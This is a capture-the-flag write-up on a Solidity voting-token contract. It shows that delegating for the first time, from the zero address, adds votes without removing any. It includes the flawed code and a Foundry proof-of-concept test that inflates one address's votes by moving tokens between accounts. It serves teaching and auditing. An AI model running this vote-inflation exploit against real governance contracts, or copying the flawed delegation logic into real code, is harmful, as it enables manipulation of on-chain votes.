# Quillaudit CTF - Voting Machine

report by @0xcharlie
Github: github.com/charliefinos

### Impact

Any user with vTokens can claim votes when using `delegate` function for the first time.

The first time`delegate` function is called `_delegates[_addr]` is zero and never checked.

So this make any user with vToken balance able to claim vTokens amount of votes.

To keep claiming votes, a bad user can transfer vTokens to new accounts and use `delegate` and claim votes so on. 

This contracts allows to claim any amount of tokens due to an initialization 

```solidity
function _delegate(address _addr, address delegatee) internal {
        // First _delegates for Alice will be 0
        address currentDelegate = _delegates[_addr];
				// Alice have 1000 tokens
        uint256 _addrBalance = balanceOf(_addr);
        _delegates[_addr] = delegatee;
        _moveDelegates(currentDelegate, delegatee, _addrBalance);
    }
```

Since `currentDelegate` = 0 the first time it won’t pass and not get updated, just the `to` address

```solidity
function _moveDelegates(address from, address to, uint256 amount) internal {
        if (from != to && amount > 0) {
						// if from is == address(0) it wont revert
            if (from != address(0)) {
                uint32 fromNum = numCheckpoints[from];
                uint256 fromOld = fromNum > 0
                    ? checkpoints[from][fromNum - 1].votes
                    : 0;
                uint256 fromNew = fromOld - amount;
                _writeCheckpoint(from, fromNum, fromOld, fromNew);
            }

            if (to != address(0)) {
                uint32 toNum = numCheckpoints[to];
                uint256 toOld = toNum > 0
                    ? checkpoints[to][toNum - 1].votes
                    : 0;
                uint256 toNew = toOld + amount;
                _writeCheckpoint(to, toNum, toOld, toNew);
            }
        }
    }
```

### Proof of Concept

To Reproduce this code, copy and paste this test function to your foundry test file.

```solidity
function testExploit() public {
        // Solution
				// Alice delegate 100 votes to hacker
        vm.startPrank(alice);
        vToken.delegate(hacker);
				// Approve and send tokens to bob
        vToken.approve(bob, 1000);
        vToken.transfer(bob, 1000);
        vm.stopPrank();
				
        vm.startPrank(bob);
				// Bob delegates 1000 votes to hacker
        vToken.delegate(hacker);
				// Approve and send tokens to carl
        vToken.approve(carl, 1000);
        vToken.transfer(carl, 1000);
        vm.stopPrank();

        vm.startPrank(carl);
				// Carl delegates 1000 votes to hacker
        vToken.delegate(hacker);
				// Approve and send tokens to hacker
        vToken.approve(hacker, 1000);
        vToken.transfer(hacker, 1000);
        vm.stopPrank();
				
				// Hacker vToken votes should be 3000
        uint hacker_vote = vToken.getVotes(hacker);
        console.log("Vote Count of Hacker before attack: %s ", hacker_vote);
				// Hackers balance of vToken should be 1000
        uint hacker_balance = vToken.balanceOf(hacker);
        console.log("Hacker's vToken after the attack: %s: ", hacker_balance);

        assertEq(hacker_vote, 3000);
        assertEq(hacker_balance, 1000);
    }
}
```